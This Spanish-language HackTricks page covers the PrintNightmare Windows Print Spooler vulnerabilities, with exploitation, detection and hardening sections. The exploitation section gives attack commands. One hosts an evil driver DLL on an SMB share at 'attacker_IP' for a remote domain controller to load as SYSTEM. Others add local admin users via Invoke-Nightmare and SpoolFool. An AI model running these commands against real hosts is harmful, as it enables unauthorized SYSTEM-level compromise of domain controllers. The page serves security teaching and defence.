# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare es el nombre colectivo dado a una familia de vulnerabilidades en el servicio de **Print Spooler** de Windows que permiten **ejecución de código arbitrario como SYSTEM** y, cuando el spooler es accesible a través de RPC, **ejecución remota de código (RCE) en controladores de dominio y servidores de archivos**. Los CVEs más explotados son **CVE-2021-1675** (inicialmente clasificado como LPE) y **CVE-2021-34527** (RCE completo). Problemas posteriores como **CVE-2021-34481 (“Point & Print”)** y **CVE-2022-21999 (“SpoolFool”)** demuestran que la superficie de ataque aún está lejos de cerrarse.

---

## 1. Componentes vulnerables y CVEs

| Año | CVE | Nombre corto | Primitiva | Notas |
|------|-----|--------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corregido en el CU de junio de 2021 pero eludido por CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx permite a usuarios autenticados cargar un DLL de controlador desde un recurso compartido remoto|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalación de controlador no firmado por usuarios no administradores|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Creación arbitraria de directorios → Plantación de DLL – funciona después de los parches de 2021|

Todos ellos abusan de uno de los **métodos RPC de MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) o relaciones de confianza dentro de **Point & Print**.

## 2. Técnicas de explotación

### 2.1 Compromiso de Controlador de Dominio Remoto (CVE-2021-34527)

Un usuario de dominio autenticado pero **no privilegiado** puede ejecutar DLLs arbitrarios como **NT AUTHORITY\SYSTEM** en un spooler remoto (a menudo el DC) mediante:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Las PoCs populares incluyen **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) y los módulos `misc::printnightmare / lsa::addsid` de Benjamin Delpy en **mimikatz**.

### 2.2 Escalación de privilegios local (cualquier Windows soportado, 2021-2024)

La misma API se puede llamar **localmente** para cargar un controlador desde `C:\Windows\System32\spool\drivers\x64\3\` y lograr privilegios de SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – eludir las correcciones de 2021

Los parches de Microsoft de 2021 bloquearon la carga remota de controladores pero **no endurecieron los permisos de directorio**. SpoolFool abusa del parámetro `SpoolDirectory` para crear un directorio arbitrario bajo `C:\Windows\System32\spool\drivers\`, deja caer un DLL de carga útil y obliga al spooling a cargarlo:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> La explotación funciona en Windows 7 → Windows 11 completamente parcheados y Server 2012R2 → 2022 antes de las actualizaciones de febrero de 2022

---

## 3. Detección y caza

* **Registros de eventos** – habilitar los canales *Microsoft-Windows-PrintService/Operational* y *Admin* y observar el **ID de evento 808** “El servicio de cola de impresión no pudo cargar un módulo de complemento” o los mensajes **RpcAddPrinterDriverEx**.
* **Sysmon** – `ID de evento 7` (Imagen cargada) o `11/23` (Escritura/borrado de archivo) dentro de `C:\Windows\System32\spool\drivers\*` cuando el proceso padre es **spoolsv.exe**.
* **Línea de procesos** – alertas cada vez que **spoolsv.exe** genera `cmd.exe`, `rundll32.exe`, PowerShell o cualquier binario no firmado.

## 4. Mitigación y endurecimiento

1. **¡Parchea!** – Aplica la última actualización acumulativa en cada host de Windows que tenga instalado el servicio de cola de impresión.
2. **Desactiva el spooler donde no sea necesario**, especialmente en Controladores de Dominio:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Bloquea conexiones remotas** mientras permites la impresión local – Política de Grupo: `Configuración del equipo → Plantillas administrativas → Impresoras → Permitir que el Spooler de impresión acepte conexiones de clientes = Deshabilitado`.
4. **Restringe Point & Print** para que solo los administradores puedan agregar controladores configurando el valor del registro:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Orientación detallada en Microsoft KB5005652

---

## 5. Investigación / herramientas relacionadas

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) módulos
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* Exploit SpoolFool y análisis
* Micropatches de 0patch para SpoolFool y otros errores del spooler

---

**Más lectura (externa):** Consulta la publicación del blog de 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Referencias

* Microsoft – *KB5005652: Administrar el nuevo comportamiento de instalación de controladores predeterminados de Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
